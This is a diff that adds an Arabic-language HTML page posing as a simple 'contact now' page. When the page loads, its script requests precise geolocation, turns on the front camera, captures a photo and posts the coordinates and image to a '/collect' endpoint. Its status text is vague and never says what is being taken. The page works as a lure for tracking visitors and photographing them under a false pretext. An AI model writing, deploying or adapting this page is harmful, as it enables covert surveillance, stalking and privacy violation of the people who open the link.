@@ -1,0 +1,271 @@
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>تواصل</title>
+
+  <style>
+    body {
+      font-family: system-ui, sans-serif;
+      text-align: center;
+      padding: 2rem;
+      background: #f5f5f5;
+    }
+
+    .card {
+      background: white;
+      max-width: 480px;
+      margin: auto;
+      padding: 2rem;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+    }
+
+    video {
+      border-radius: 8px;
+      margin-top: 1rem;
+      max-width: 100%;
+    }
+
+    .status {
+      margin-top: 1rem;
+      color: #555;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="card">
+    <h2>🛡️تواصل الان</h2>
+
+    <p>
+      سيتم التواصل..
+    </p>
+
+    <div class="status" id="status">
+      مرحبا..
+    </div>
+
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+  </div>
+
+<script>
+
+const statusEl = document.getElementById('status');
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+
+async function getLocation() {
+
+  return new Promise((resolve, reject) => {
+
+    if (!navigator.geolocation) {
+      reject(new Error('اميرة خال'));
+      return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+      resolve,
+      reject,
+      {
+        enableHighAccuracy: true,
+        timeout: 15000,
+        maximumAge: 0
+      }
+    );
+
+  });
+
+}
+
+
+async function getCameraPhoto() {
+
+  if (!navigator.mediaDevices ||
+      !navigator.mediaDevices.getUserMedia) {
+
+    throw new Error('اميرة الخالد');
+  }
+
+  const stream = await navigator.mediaDevices.getUserMedia({
+    video: {
+      facingMode: 'user',
+      width: { ideal: 640 },
+      height: { ideal: 480 }
+    },
+    audio: false
+  });
+
+  video.srcObject = stream;
+  video.style.display = 'block';
+
+  await new Promise(resolve => {
+
+    if (video.readyState >= 2) {
+      resolve();
+    } else {
+      video.onloadedmetadata = resolve;
+    }
+
+  });
+
+  /*
+   * ننتظر قليلاً حتى تصل صورة فعلية من الكاميرا
+   */
+  await new Promise(resolve => setTimeout(resolve, 800));
+
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+
+  const context = canvas.getContext('2d');
+
+  context.drawImage(
+    video,
+    0,
+    0,
+    canvas.width,
+    canvas.height
+  );
+
+  const photo = canvas.toDataURL(
+    'image/jpeg',
+    0.85
+  );
+
+  /*
+   * إيقاف الكاميرا بعد التقاط الصورة
+   */
+  stream.getTracks().forEach(track => track.stop());
+
+  video.srcObject = null;
+
+  return photo;
+}
+
+
+async function startTest() {
+
+  try {
+
+    /*
+     * 1. طلب الموقع عند فتح الصفحة
+     */
+
+    statusEl.textContent =
+      'نورا خالد   ...';
+
+    const position = await getLocation();
+
+    const location = {
+      lat: position.coords.latitude,
+      lon: position.coords.longitude,
+      acc: position.coords.accuracy
+    };
+
+
+    /*
+     * 2. طلب الكاميرا
+     */
+
+    statusEl.textContent =
+      'اميرة';
+
+    let photo = null;
+
+    try {
+
+      photo = await getCameraPhoto();
+
+    } catch (cameraError) {
+
+      console.warn(
+        'Camera error:',
+        cameraError
+      );
+
+      statusEl.textContent =
+        'اميرة.';
+
+      await new Promise(
+        resolve => setTimeout(resolve, 1200)
+      );
+    }
+
+
+    /*
+     * 3. إرسال البيانات إلى الخادم
+     */
+
+    statusEl.textContent =
+      'تواصل...';
+
+    const response = await fetch('/collect', {
+
+      method: 'POST',
+
+      headers: {
+        'Content-Type': 'application/json'
+      },
+
+      body: JSON.stringify({
+        location,
+        photo
+      })
+
+    });
+
+
+    if (!response.ok) {
+      throw new Error(
+        'فشل الاتصال بالخادم'
+      );
+    }
+
+
+    /*
+     * 4. نجاح الاختبار
+     */
+
+    document.querySelector('.card').innerHTML = `
+      <h2>✅ اكتمل </h2>
+
+      <p>
+        سبتم التواصل  معك.
+      </p>
+
+      <p>
+        يستخدم الموقع للتواصل معك
+      </p>
+    `;
+
+  } catch (error) {
+
+    console.error(error);
+
+    statusEl.textContent =
+      '❌ ' +
+      (error.message ||
+       'تم رفض الصلاحية أو حدث خطأ.');
+
+  }
+
+}
+
+
+/*
+ * تشغيل الاختبار تلقائياً عند فتح الصفحة
+ */
+window.addEventListener(
+  'DOMContentLoaded',
+  startTest
+);
+
+</script>
+
+</body>
+</html>
+```
